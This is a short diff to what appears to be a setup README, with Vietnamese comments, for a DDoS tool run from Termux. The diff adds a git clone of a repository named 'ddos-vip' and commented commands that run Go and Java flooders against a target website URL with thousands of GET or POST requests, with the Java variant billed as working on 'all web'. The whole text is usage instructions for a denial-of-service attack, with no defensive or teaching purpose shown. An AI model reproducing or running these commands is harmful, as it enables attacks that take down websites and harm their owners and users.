@@ -3,12 +3,14 @@ pkg install golang
 
 pkg install openjdk-17
 # Lệnh Vào Tool
+git clone https://github.com/User-xquyen/ddos-vip
+
 cd toolddos-vippro
-# Get
+# Chế độ Get sài cho web https://
 go run ddosbyXQ.go https://linkweb.com 5000 get 5000 nil
-# Post
+# Chế độ Post sài cho web http://
 go run ddosbyXQ.go https://linkweb.com 5000 post 5000 header.txt
-# Java
+# Java DDoS siêu bá cân all web
 java ddosbyXQ.java
 
 Link web:
